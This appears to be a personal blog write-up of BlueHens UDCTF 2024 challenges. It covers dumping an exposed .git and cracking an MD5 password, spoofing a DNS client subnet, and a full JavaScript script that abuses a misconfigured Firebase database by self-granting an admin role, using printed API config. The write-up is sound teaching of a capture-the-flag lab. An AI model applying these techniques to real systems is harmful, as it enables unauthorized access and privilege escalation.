+++
date = '2024-11-11T14:14:28+01:00'
draft = false
title = 'BlueHens UDCTF 2024 - WriteUp'
author = 'TheMrEviil'
categories = ['writeups']
+++


## WEB - Training Problem: Intro to Web



Description:
```
It's nice to have some training problems.

-ProfNinja

https://bluehens-webstuff.chals.io/

```
After open website my Chrome extenstion DotGit notify me about avaible .git on this site 

![image dotgit](/post/bluehens2024/dotgit.png)


I downloaded this and start reading logs `git log`


![image gitlog](/post/bluehens2024/gitlog.png)

let's check commit 'password based login?'
![image gitlog](/post/bluehens2024/gitshow.png)

We got MD5 hash go to crackstation and lat's try crack password
![image gitlog](/post/bluehens2024/crackstation.png)

After cract we have password `1qaz2wsx` let's go on page from code https://bluehens-webstuff.chals.io/flagme.php?password=1qaz2wsx 
![image gitlog](/post/bluehens2024/url_flag.png)


## WEB - DNS

Description:
```
This DNS server reveals a secret to a special IP. 
Can you make it think you’re connecting from 127.0.0.1?

dig TXT flag @129.153.36.153

-JD (sr.)
```
fast check in the best tool for hacking - Google
and we have answer how do this task 
`dig TXT flag @129.153.36.153 +subnet=127.0.0.1`

![image gitlog](/post/bluehens2024/digsubnet.png)

## WEB - Firefun 3 

Description:
```
Our fireplace company was all set to take off for the moon, then we had to shut it all down. All that's left is a simple landing page.

-ProfNinja

Dedicated to Nisala

https://fire.prof.ninja/
```
This task was very hard for me, I spent something like around 10 hours on this challange. but how i done this...

On website we have normal static page with twice comments, but interesting information we have on 404 website 

![image gitlog](/post/bluehens2024/404.png)

We have `Firebase Command-Line Interface` this information change all. Quick research about Firebase (7 hours...) and nothing...  When my psyche was dying my friend from team find and send me this `https://fire.prof.ninja/__/firebase/init.js` 

WE GOT API KEYS !!!!

but I don't know what's give me this... Let's research more

I found a lot of tools to testing this credentials. Tools like this:
- https://github.com/iosiro/baserunner
- https://github.com/0xbigshaq/firepwn-tool/tree/master

but this don't give me flag, in Firepwn I created user but i don't know collections in Firebase. In Baserunner i logged, send request and have my favourite response `Permission denid` lovley...

let's go to documentatnion Firebase SDK and in this we got inforamtion about something interesting. 

FIREBASE STORAGE and we can get something from this let's try and write some code

Start some front:
```
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firebase Storage Test</title>
</head>
<body>
    <h1>Lista plików z Firebase Storage</h1>
    <ul id="file-list"></ul>

    <!-- Firebase SDK w wersji dla przeglądarek -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
        <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script> <!-- Dodaj Realtime Database -->

    <!-- Własny skrypt -->
    <script src="app.js"></script>
</body>
</html>

```
Next go to `app.js` i trying get folders but `PERMISSION DENID` after more hours in docs i found login let's try login using my credentials from Firepwn and we have HINT:
![image gitlog](/post/bluehens2024/rulesfirebase.png)

Let's more research (ChatGPT pleas help me and explain me what i'm doing) and we write something like this

```
const firebaseConfig = {
  apiKey: "AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU",
  authDomain: "udctf24.firebaseapp.com",
  projectId: "udctf24",
  storageBucket: "udctf24.firebasestorage.app",
  databaseURL: "https://udctf24-default-rtdb.firebaseio.com", 
};

firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const auth = firebase.auth();
const database = firebase.database();

async function listFilesRecursively(ref, depth = 0) {
  try {
    const res = await ref.listAll();

    res.prefixes.forEach((folderRef) => {
      console.log(`${' '.repeat(depth * 2)}📂 ${folderRef.name}`);
      listFilesRecursively(folderRef, depth + 1); 
    });

    res.items.forEach(async (itemRef) => {
      const url = await itemRef.getDownloadURL();
      console.log(`${' '.repeat(depth * 2)}📄 ${itemRef.name} - URL: ${url}`);
    });
  } catch (error) {
    console.error("Error:", error);
  }
}

function checkAdminPermissions(user) {
  const adminRef = database.ref(`users/${user.uid}/roles/admin`);

  return adminRef.once('value').then((snapshot) => {
    const isAdmin = snapshot.exists();
    
      const rootRef = storage.ref().child(""); 
      listFilesRecursively(rootRef);
   
  }).catch((error) => {
    console.error("Error:", error);
  });
}

function login() {
  const email = "test@test.pl";
  const password = "test1234";

  auth.signInWithEmailAndPassword(email, password)
    .then((userCredential) => {
      console.log("Login:", userCredential.user);
      const user = firebase.auth().currentUser;
      const adminRef = firebase.database().ref(`users/${user.uid}/roles/admin`);

      adminRef.set(true)
        .then(() => {
          console.log("Admin:", user.uid);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
      checkAdminPermissions(userCredential.user);
      readFlag()
    })
    .catch((error) => {
      console.error("Error:", error.message);
    });
}
function readFlag() {
  const flagRef = database.ref("flag");

  flagRef.once("value")
    .then((snapshot) => {
      if (snapshot.exists()) {
        const flag = snapshot.val();
        console.log("Flaga:", flag);
      } else {
        console.log("Flag not found.");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
window.onload = login;


```

What's this?

We use created user to login, with default permission Firebase return image with permission rules, but we can creates or updates a reference in Realtime Database at users/{userId}/roles/admin, setting the value to true. This effectively grants the user an "admin" role and we can read a flag using this code :)


![image gitlog](/post/bluehens2024/fire_flag.png)



## Crypto - Nonogram Pt. 1: Simple Enough

Description: 

```
When you get past the puzzle, you now face a classic encryption / old-school stego encoding. Wrap the text you find in UDCTF{TEXTHERE}.

-Grace

http://www.landofcrispy.com/nonogrammer/nonogram.html?mode=play&puzzle=17|15|1x4.1x4,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x8,1x2.1x2.1x4,1x2.1x2.1x2.1x2,1x2.1x2.1x2.1x2,1x6.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x3,1x9|1x1,1x8,1x9,1x1.1x2,1x1.1x1.1x1,1x12,1x12,1x1.1x1.1x1,1x1.1x1.1x2.1x1,1x9.1x1,1x8.1x1,1x1.1x2.1x2,1x2.1x3,1x9,1x6|x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x&palette=white.grey.X,black..&msg=df1b4ee23140ab89541134c295c4d696774c1ec8ddf6550353ef53096152657cc9e79a0300200931353c6e9aaa446c2f55684c39d4
```
It's funny game, let's make this

![image gitlog](/post/bluehens2024/nanogram.png)

When we make it, game give us a strings like on image. Paste to ChatGPT and we got PIXELATED

Flag: `UDCTF{PIXELATED}`


Thats all my solutions challanges :) 
Add to RSS